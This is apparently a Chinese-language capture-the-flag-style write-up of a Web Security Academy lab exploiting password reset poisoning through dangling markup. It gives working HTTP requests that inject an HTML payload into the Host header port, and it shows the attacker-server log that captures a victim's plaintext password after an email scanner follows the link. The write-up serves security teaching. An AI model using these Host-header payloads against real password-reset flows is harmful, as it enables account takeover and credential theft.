# 实验：通过悬空标记进行密码重置投毒

本实验存在通过悬空标记（dangling markup）进行密码重置投毒的漏洞。为了解决本实验，请登录 Carlos 的账户。

你可以使用以下凭据登录自己的账户：`wiener:peter`。发送到此账户的任何电子邮件都可以通过利用服务器上的电子邮件客户端阅读。

> **提示**
> 某些防病毒软件会扫描电子邮件中的链接以识别它们是否恶意。

## 步骤

探测
- 使用密码重置功能

    ```http
    POST /forgot-password HTTP/2
    Host: id.web-security-academy.net

    csrf=pxYFOyrRgxmQmMTILIC6r1Mr3wNVAjTX&username=wiener
    ```
    - csrf 令牌可多次复用

- 查看邮箱
    ```html
    <p>Hello!</p><p>Please <a href='https://id.web-security-academy.net/login'>click here</a> to login with your new password: DoZ95phVh6</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
    ```
    - 密码使用明文发送到邮箱。此处并非窃取重置令牌，而是邮箱内的密码
    - `This email has been scanned by the MacCarthy Email Security service` 提示邮件被扫描，即链接可能被访问。结合题目提示，此处并非受害者点击，而是防御扫描软件访问链接

exploit-id.exploit-server.net

测试一系列 Host 头攻击
- 双重 Host
    - 失败，得到 RST
- 缩进双重 Host
    - 失败
- 绝对 URL
    - 失败

- 载荷设置到 Host 端口
    ```http
    POST /forgot-password HTTP/2
    Host: id.web-security-academy.net:exploit-id.exploit-server.net
    ```

    - 成功
        ```html
        <p>Hello!</p><p>Please <a href='https://id.web-security-academy.net:exploit-id.exploit-server.net/login'>click here</a> to login with your new password: kZpA1C8AyC</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
        ```

- 载荷注入点在 Host 头的端口处

尝试测试带外
- 构造 `用户名:密码@主机` 混淆格式
    ```http
    POST /forgot-password HTTP/2
    Host: id.web-security-academy.net:foo@exploit-id.exploit-server.net
    ```

    - 邮件内容
        ```html
        <p>Hello!</p><p>Please <a href='https://id.web-security-academy.net:foo@exploit-id.exploit-server.net/login'>click here</a> to login with your new password: vzQrd5HrXt</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
        ```

    - 攻击者服务器访问日志
        ```log
        10.0.4.171      2026-08-17 02:15:37 +0000 "GET /login HTTP/1.1" 404 
        ```
        - 混淆格式成功，拥有访问记录

- 防御扫描访问链接，且成功以混淆格式移除原域名前缀


尝试注入 HTML 元字符，悬空窃取邮件内密码
- 分析注入点上下文
    ```html
    <a href='x'></a><img src="https://exploit-id.exploit-server.net/data?
    ```
- 构造重置投毒请求
    ```http
    POST /forgot-password HTTP/2
    Host: id.web-security-academy.net:x'></a><img src="https://exploit-id.exploit-server.net/data?
    ```

- 查看邮件
    ```html
    <p>Hello!</p><p>Please <a href='https://id.web-security-academy.net:x'></a><img src="https://exploit-id.exploit-server.net/data?/login'>click here</a> to login with your new password: 7rJeaOP5Us</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
    ```

- 查看攻击者服务器 log
    ```log
    10.0.4.171      2026-08-17 02:28:44 +0000 "GET /data?/login'>click+here</a>+to+login+with+your+new+password:+7rJeaOP5Us</p><p>Thanks,<br/>Support+team</p><i>This+email+has+been+scanned+by+the+MacCarthy+Email+Security+service</i> HTTP/1.1" 404 
    ```

- 成功获取由防御扫描软件访问悬空链接而触发重置密码泄露
